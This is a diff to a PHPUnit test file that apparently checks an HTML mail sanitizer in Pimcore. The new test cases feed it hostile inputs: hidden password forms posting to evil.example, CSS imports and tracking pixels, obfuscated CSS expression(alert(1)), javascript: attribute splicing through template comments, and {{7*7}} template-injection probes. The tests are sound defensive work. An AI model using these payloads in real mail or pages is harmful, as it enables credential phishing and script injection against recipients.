@@ -68,6 +68,31 @@ final class TestMailHtmlTest extends \PHPUnit\Framework\TestCase
                 ['<iframe', 'evil.example'],
                 ['Hello'],
             ],
+            'form hidden behind a comment terminator' => [
+                '<p>Hello</p><!-- --!><form action=x><input type=password></form> -->',
+                ['<form', '<input', 'type=password'],
+                ['Hello'],
+            ],
+            'form inside a conditional comment' => [
+                '<p>Hello</p><!--[if mso]><form action="https://evil.example/collect"><input type="password"></form><![endif]-->',
+                ['<form', '<input', 'evil.example'],
+                ['Hello'],
+            ],
+            'style element' => [
+                '<p>Hello</p><style>@import url(https://evil.example/x.css); p { background: url(https://evil.example/pixel) }</style>',
+                ['<style', '@import', 'evil.example'],
+                ['Hello'],
+            ],
+            'css expression with comment' => [
+                '<p style="width: expr/**/ession(alert(1))">Hello</p>',
+                ['ession(', 'alert(1)'],
+                ['Hello'],
+            ],
+            'css expression with escape' => [
+                '<p style="width: \\65 xpression(alert(1))">Hello</p>',
+                ['ession(', 'alert(1)'],
+                ['Hello'],
+            ],
             'select and textarea' => [
                 '<p>Hello</p><select name="s"><option>one</option></select><textarea name="t">x</textarea>',
                 ['<select', '<option', '<textarea'],
@@ -111,18 +136,47 @@ final class TestMailHtmlTest extends \PHPUnit\Framework\TestCase
     #[\PHPUnit\Framework\Attributes\DataProvider('harmlessHtmlProvider')]
     public function testControlHarmlessHtmlIsSentUnchanged(string $content): void
     {
-        $mail = new \Pimcore\Mail();
-        $mail->html($content);
-        $mail->to('testmail-recipient@example.test');
-        $mail->send();
-        $this->assertCount(1, $this->sentMails);
-        $unfiltered = $this->sentMails[0]['html'];
-
-        $this->sentMails = [];
         $this->sendHtml($content);
 
         $this->assertCount(1, $this->sentMails);
-        $this->assertSame($unfiltered, $this->sentMails[0]['html']);
+        $this->assertSame($this->withoutDocumentWrapper($content), $this->withoutDocumentWrapper($this->sentMails[0]['html']));
+    }
+
+    public function testTemplateCommentCannotSpliceAttributesIntoTheSentMarkup(): void
+    {
+        $this->sendHtml("<a a='{#\"' b=\"#}' href=javascript:alert(1) onmouseover=alert(2) x=\">Login</a>");
+
+        $this->assertCount(1, $this->sentMails);
+        $html = $this->sentMails[0]['html'];
+        $this->assertStringContainsString('{#', $html);
+
+        $document = new \DOMDocument();
+        $previous = libxml_use_internal_errors(true);
+        $document->loadHTML('<?xml encoding="UTF-8">' . $html);
+        libxml_clear_errors();
+        libxml_use_internal_errors($previous);
+
+        $attributeNames = [];
+        foreach ($document->getElementsByTagName('a') as $anchor) {
+            foreach ($anchor->attributes as $attribute) {
+                $attributeNames[] = $attribute->nodeName;
+            }
+        }
+        sort($attributeNames);
+
+        $this->assertSame(['a', 'b'], $attributeNames);
+    }
+
+    public function testTemplateSyntaxInContentAndSubjectIsSentLiterally(): void
+    {
+        $this->sendMail(['emailType' => 'html', 'content' => '<p>{{7*7}}</p>', 'subject' => 'Subject {{7*7}}']);
+        $this->sendMail(['emailType' => 'text', 'content' => 'Text {{7*7}}', 'subject' => 'Subject {{7*7}}']);
+
+        $this->assertCount(2, $this->sentMails);
+        $this->assertStringContainsString('<p>{{7*7}}</p>', $this->sentMails[0]['html']);
+        $this->assertSame('Subject {{7*7}}', $this->sentMails[0]['subject']);
+        $this->assertSame('Text {{7*7}}', $this->sentMails[1]['text']);
+        $this->assertSame('Subject {{7*7}}', $this->sentMails[1]['subject']);
     }
 
     public function testControlTextMailIsSentVerbatim(): void
@@ -141,6 +195,13 @@ final class TestMailHtmlTest extends \PHPUnit\Framework\TestCase
         $this->expectExceptionMessage("Permission denied, user needs 'emails' permission.");
 
         $this->sendHtml('<p>Hello</p>');
+    }
+
+    private function withoutDocumentWrapper(string $html): string
+    {
+        $html = (string) preg_replace('~<!DOCTYPE[^>]*>|</?html>|</?body>~i', '', $html);
+
+        return str_replace("\n", '', $html);
     }
 
     private function sendHtml(string $content): void
